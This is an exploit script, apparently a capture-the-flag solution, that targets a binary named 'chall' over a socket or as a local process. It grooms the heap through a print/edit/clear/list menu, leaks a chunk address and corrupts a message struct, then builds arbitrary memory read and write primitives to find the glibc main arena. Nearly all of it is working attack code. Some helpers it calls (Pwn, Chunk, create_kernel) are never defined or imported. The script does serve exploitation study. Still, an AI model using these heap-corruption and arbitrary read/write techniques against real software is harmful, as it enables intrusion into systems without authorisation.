#!/usr/bin/env python

from chdrft.cmds import CmdsList
from chdrft.main import app
from chdrft.utils.cmdify import ActionHandler
from chdrft.utils.misc import Attributize
import chdrft.utils.misc as cmisc
import glog
from chdrft.tube.connection import Connection
from chdrft.tube.process import Process
from contextlib import ExitStack
from chdrft.utils.misc import PatternMatcher
import random
import time
from chdrft.utils.fmt import Format
import re
import struct
from chdrft.emu.base import Memory
from chdrft.emu.binary import Arch
from chdrft.emu.trace import Display
import threading
import sys
import pprint
import traceback as tb
import os
import math

global flags, cache
flags = None
cache = None


def args(parser):
  clist = CmdsList().add(test).add(test2)
  parser.add_argument('--local', action='store_true')
  ActionHandler.Prepare(parser, clist.lst)

class Client(ExitStack):

  def __init__(self, conn):
    super().__init__()
    self.conn = conn

  def __enter__(self):
    super().__enter__()
    self.enter_context(self.conn)
    self.conn.recv_until('5. Quit\n>>')
    return self

  def send_multiple(self, data, ignore_nl=0):
    for i, e in enumerate(data):
      if isinstance(e, int):
        e = str(e).encode() + b'\n'
      else:
        e = Format(e).tobytes().v
        assert ignore_nl or e.find(b'\n') == -1

      if i+1 != len(data):
        res = self.conn.send_and_expect(e, '>>')
      else:
        res = self.conn.send_and_expect(e, '5. Quit\n>>')
      if res.find(b'1. Print') != -1: break
    return res

  def print(self, msg_id, msg, msg_len=None, ignore_nl=0):
    if msg_len is None: msg_len = len(msg)
    msg_len += 1
    self.send_multiple([1, msg_id, msg_len, msg], ignore_nl=ignore_nl)

  def edit(self, msg_id, msg, want_len):
    msg = Format(msg).pad(want_len, 0).v
    self.send_multiple([2, msg_id, msg])

  def clear(self, msg_id):
    self.send_multiple([3, msg_id])

  def list(self):
    res = self.send_multiple([4])
    lst = []
    for m in re.finditer(b'\[\+\] \[(\d+)\]\[(.*)\]\n', res, re.MULTILINE):
      lst.append((int(m.group(1)), m.group(2)))
    return lst

  def quit(self):
    self.conn.send(b'5\n')




def test(ctx):
  random.seed(0)
  #conn = Connection('finale-docker.rtfm.re', 2323)
  if flags.local:
    conn = Process('./chall')
  else:
    conn = Connection('localhost', 1234)

  with Client(conn) as c:
    buf = b'a' * 0x10


    N = 16
    for i in range(N):
      c.print(i, b'\n', 0x200, ignore_nl=1)
    for i in reversed(range(N)):
      c.clear(i)

    tlen = 0x1f  # tlen + 1 == 0x20 -> size of struct message
    b_struct = b'\x00' * tlen
    c.print(0, b'\n', 0x200, ignore_nl=1)
    c.print(1, b'\n', 0x200, ignore_nl=1)
    c.print(2, b'\n', 0x200, ignore_nl=1)
    c.print(3, b'\n', 0x200, ignore_nl=1)


    c.clear(0)
    c.clear(1)
    c.clear(3)  # 3 is not unlinked
    c.clear(2)  # 2 is not unlinked

    print(c.list())
    px = c.list()[0][1]
    px = Format(px).pad(8, 0).v
    chunk_addr, = struct.unpack('<Q', px)

    c.print(0, b_struct) # msg->msg_p2, data->msg_p3
    c.print(1, b_struct)


    c.print(4, b'\n', 0x200, ignore_nl=1)
    c.print(5, b'\n', 0x200, ignore_nl=1)
    c.print(6, b'\n', 0x200, ignore_nl=1)
    c.print(7, b'\n', 0x200, ignore_nl=1)
    c.print(8, b'\n', 0x200, ignore_nl=1)
    c.print(9, b'\n', 0x200, ignore_nl=1)
    c.print(10, b'\n', 0x200, ignore_nl=1)
    c.print(11, b'\n', 0x200, ignore_nl=1)
    c.clear(8)
    c.clear(7)
    c.clear(6)
    c.clear(5)


    CTRL = 0
    TARGET_ID = 0xf
    TARGET_POS = 3
    c.edit(CTRL, struct.pack('<4Q', 0, 0, 0, TARGET_ID), tlen)
    print(hex(c.list()[TARGET_POS][0]))
    assert c.list()[TARGET_POS][0] == TARGET_ID

    def read_func(addr, n):
      res = bytearray()
      while len(res) < n:
        msg = struct.pack('<4Q', 0, addr + len(res), 0, TARGET_ID)
        if msg.find(b'\n') != -1:
          res.append(0)
          continue

        c.edit(CTRL, msg, tlen)
        id, content = c.list()[TARGET_POS]
        res += content
        res.append(0)
      return res[:n]

    def write_func(addr, data):
      # will write a nullbyte in memory after data
      c.edit(CTRL, struct.pack('<4Q', 0, addr, len(data) + 1, TARGET_ID)[:-1], tlen)
      c.edit(TARGET_ID, data, len(data))



    pwn = Pwn(read_func, write_func)
    c1 = Chunk(pwn.mem, chunk_addr)
    arena_addr = pwn.get_main_arena_addr(c1)

    create_kernel()



def test2(ctx):
  import chdrft.emu.bin_analysis as bin_analysis

  import imp
  from chdrft.emu.elf import ElfUtils
  bin_analysis = imp.reload(bin_analysis)

  binary = './chall'
  elf = ElfUtils(binary)
  print(hex(elf.get_entry_address()))
  #elf.offset = entry_addr - elf.get_entry_address()
  print(hex(elf.get_entry_address()))
  print(hex(elf.get_symbol('main')))
  data = bin_analysis.r2_extract_all(binary)
  bh = bin_analysis.BinHelper(binary, data)
  view_s = cmisc.get_uniq(bh.find_strs('Creating a new'))
  print(view_s.xrefs.keys())
  for e in data.f['main'].coderefs_funcs_list:
    print(e.addr, e.sink.name)
  print(hex(cmisc.get_uniq(data.f['sym.menu'].codexrefs_funcs['main']).addr))






def main():
  ctx = Attributize()
  ActionHandler.Run(ctx)


app()
